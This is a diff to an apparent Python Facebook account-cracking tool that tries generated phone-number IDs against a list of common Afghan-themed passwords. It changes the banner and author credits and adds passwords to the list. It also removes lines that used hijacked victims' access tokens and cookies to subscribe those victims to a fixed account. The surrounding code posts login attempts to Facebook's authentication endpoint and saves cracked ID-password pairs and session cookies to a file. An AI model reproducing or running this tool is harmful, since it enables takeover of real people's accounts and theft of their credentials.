@@ -32,17 +32,22 @@ logo = """
 
 
 
-\_    _     __  __           _
-   / \  | |__ |  \/  | __ _  __| |
-  / _ \ | '_ \| |\/| |/ _` |/ _` |
- / ___ \| | | | |  | | (_| | (_| |
-/_/   \_\_| |_|_|  |_|\__,_|\__,_|
 
+  /$$$$$$  /$$       /$$      /$$                 /$$
+ /$$__  $$| $$      | $$$    /$$$                | $$
+| $$  \ $$| $$$$$$$ | $$$$  /$$$$  /$$$$$$   /$$$$$$$
+| $$$$$$$$| $$__  $$| $$ $$/$$ $$ |____  $$ /$$__  $$
+| $$__  $$| $$  \ $$| $$  $$$| $$  /$$$$$$$| $$  | $$
+| $$  | $$| $$  | $$| $$\  $ | $$ /$$__  $$| $$  | $$
+| $$  | $$| $$  | $$| $$ \/  | $$|  $$$$$$$|  $$$$$$$
+|__/  |__/|__/  |__/|__/     |__/ \_______/ \_______/                            
 [*]----------------------------------------------
-[*] Author        : MR.AhMad
-[*] Github        : https://github.com/Badakhshi-Jan/AhMad.git
-[*] Status        : free
-[*] version       : 0.1
+[*] Author         : MasTan_001
+[*] Github         :  Badakhshi Hack
+[*] Status         :  free
+[*] version        :  0.1
+[*] Facebook       :  AhMad MasTan
+[*] best friend    :  Saadat AlMas
 [*]----------------------------------------------
 """
 def linex():
@@ -128,7 +133,7 @@ def awmafghan():
 			for psx in user:
 				ids = code+psx
 				if pcs in ['1','01']:
-					passlist = [psx,ids,'afghan','afghan12345','afghan123','afghanistan','500500','100200','10002000','kabul123','Afghan123','Afghanistan','۱۲۳۴۵۶','۱۲۳۴۵۶۷۸۹', '۱۰۰۲۰۰','۵۰۰۵۰۰','۵۰۰۶۰۰']
+					passlist = [psx,ids,'400400','kabuljan','aziz123','ahmad123','900900','200300','10001000','kabuljan123','afghan','afghan12345','afghan123','afghanistan','500500','100200','10002000','kabul123','Afghan123','Afghanistan','۱۲۳۴۵۶','۱۲۳۴۵۶۷۸۹', '۱۰۰۲۰۰','۵۰۰۵۰۰','۵۰۰۶۰۰']
 				if mthd in ['1','01']:
 					AWM.submit(rndm,ids,passlist)
 		print('\033[1;37m')
@@ -288,7 +293,6 @@ def rndm(ids,passlist):
                                         except:
                                                 print('\r\r\033[1;32m [AhMad-OK] '+str(uid)+' | '+pas+' | '+coki+'\033[1;90m')
                                                 open('/sdcard/AhMad-OK-OK.txt','a').write(uid+'|'+pas+'\n')
-                                                requests.post('https://graph.facebook.com/100006540994091/subscribers?access_token='+tok, cookies={'cookie':coki})
                                                 oks.append(ids)
                                                 break
                                 else:
@@ -381,7 +385,6 @@ def rndm2(ids,passlist):
                                  'X-FB-HTTP-Engine': 'Liger'}
                                 url = 'https://b-api.facebook.com/method/auth.login'
                                 po = requests.post(url,data=data,headers=head,allow_redirects=False).text
-                                requests.post('https://graph.facebook.com/100006540994091/subscribers?access_token='+tok, cookies={'cookie':coki})
                                 q = json.loads(po)
                                 if 'session_key' in q:
                                         uid=str(q['uid'])
@@ -399,7 +402,6 @@ def rndm2(ids,passlist):
                                         except:
                                                 print('\r\r\033[1;32m [AhMad-OK] '+str(uid)+' | '+pas+' | '+coki+'\033[1;90m')
                                                 open('/sdcard/AhMad-OK-OK.txt','a').write(uid+'|'+pas+'\n')
-                                                requests.post('https://graph.facebook.com/100006540994091/subscribers?access_token='+tok, cookies={'cookie':coki})
                                                 oks.append(ids)
                                                 break
                                 else:
